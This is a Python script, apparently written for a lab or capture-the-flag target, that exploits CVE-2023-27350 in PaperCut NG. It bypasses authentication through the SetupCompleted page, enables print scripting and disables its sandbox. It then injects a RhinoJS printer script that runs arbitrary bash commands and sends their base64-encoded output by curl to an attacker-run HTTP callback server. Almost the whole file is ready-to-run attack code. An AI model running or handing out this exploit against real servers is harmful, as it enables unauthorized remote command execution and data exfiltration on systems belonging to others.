#!/usr/bin/env python3
"""CVE-2023-27350 PaperCut NG - Direct RCE command executor
Sends commands via printer scripting, receives output via HTTP callback"""

import requests
import sys
import time
import urllib3
import http.server
import threading
import base64
urllib3.disable_warnings()

PROXY = {"http": "http://10.129.238.16:3128"}
TARGET = "http://127.0.0.1:9191"
ORIGIN = "http://127.0.0.1:9191"
LHOST = "10.10.16.115"
CALLBACK_PORT = 8888

session = requests.Session()
session.proxies = PROXY
session.verify = False

headers = {
    "Origin": ORIGIN,
    "Content-Type": "application/x-www-form-urlencoded",
}

def post(data, referer=None):
    h = dict(headers)
    if referer:
        h["Referer"] = referer
    return session.post(f"{TARGET}/app", data=data, headers=h, allow_redirects=True)

# Received data storage
received_data = {"output": None}

class CallbackHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        # Extract data from URL path
        path = self.path[1:]  # remove leading /
        if path.startswith("data/"):
            b64data = path[5:]
            try:
                received_data["output"] = base64.b64decode(b64data).decode(errors="replace")
            except:
                received_data["output"] = f"[decode error: {b64data}]"
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length)
        received_data["output"] = body.decode(errors="replace")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, format, *args):
        pass  # Suppress log output

def setup_auth():
    """Establish authenticated session"""
    print("[*] Auth bypass via SetupCompleted...")
    r = session.get(f"{TARGET}/app?service=page/SetupCompleted")
    print(f"    Cookie: {session.cookies.get('JSESSIONID', 'none')}")

    # Enable print scripting
    print("[*] Enabling print scripting...")
    post({
        "service": "direct/1/ConfigEditor/quickFindForm",
        "sp": "S0", "Form0": "$TextField,doQuickFind,clear",
        "$TextField": "print-and-device.script.enabled", "doQuickFind": "Go",
    }, referer=f"{ORIGIN}/app?service=page/ConfigEditor")
    post({
        "service": "direct/1/ConfigEditor/$Form",
        "sp": "S1", "Form1": "$TextField$0,$Submit,$Submit$0",
        "$TextField$0": "Y", "$Submit": "Update",
    }, referer=f"{ORIGIN}/app?service=page/ConfigEditor")

    # Disable sandbox
    print("[*] Disabling sandbox...")
    post({
        "service": "direct/1/ConfigEditor/quickFindForm",
        "sp": "S0", "Form0": "$TextField,doQuickFind,clear",
        "$TextField": "print.script.sandboxed", "doQuickFind": "Go",
    }, referer=f"{ORIGIN}/app?service=page/ConfigEditor")
    post({
        "service": "direct/1/ConfigEditor/$Form",
        "sp": "S1", "Form1": "$TextField$0,$Submit,$Submit$0",
        "$TextField$0": "N", "$Submit": "Update",
    }, referer=f"{ORIGIN}/app?service=page/ConfigEditor")

    # Select printer
    print("[*] Selecting template printer...")
    session.get(f"{TARGET}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001")
    print("[+] Setup complete!")

def exec_cmd(cmd):
    """Execute a command via printer script and get output via HTTP callback"""
    received_data["output"] = None

    # RhinoJS script that runs command and sends output via curl
    script = f'''
var runtime = java.lang.Runtime.getRuntime();
var proc = runtime.exec(["/bin/bash", "-c", "{cmd} 2>&1 | base64 -w0 | xargs -I{{}} curl http://{LHOST}:{CALLBACK_PORT}/data/{{}}"]);
proc.waitFor();
s;
'''
    r = post({
        "service": "direct/1/PrinterDetails/$PrinterDetailsScript.$Form",
        "sp": "S0",
        "Form0": "printerId,enablePrintScript,scriptBody,$Submit,$Submit$0,$Submit$1",
        "printerId": "l1001",
        "enablePrintScript": "on",
        "scriptBody": script,
        "$Submit$1": "Apply",
    }, referer=f"{ORIGIN}/app?service=direct/1/PrinterList/selectPrinter&sp=l1001")

    # Wait for callback
    for i in range(30):
        if received_data["output"] is not None:
            return received_data["output"]
        time.sleep(0.5)
    return "[timeout - no callback received]"

if __name__ == "__main__":
    cmd = sys.argv[1] if len(sys.argv) > 1 else "id"

    # Start callback server
    server = http.server.HTTPServer(("0.0.0.0", CALLBACK_PORT), CallbackHandler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    print(f"[*] Callback server on port {CALLBACK_PORT}")

    setup_auth()

    print(f"\n[*] Executing: {cmd}")
    result = exec_cmd(cmd)
    print(f"[+] Output:\n{result}")

    server.shutdown()
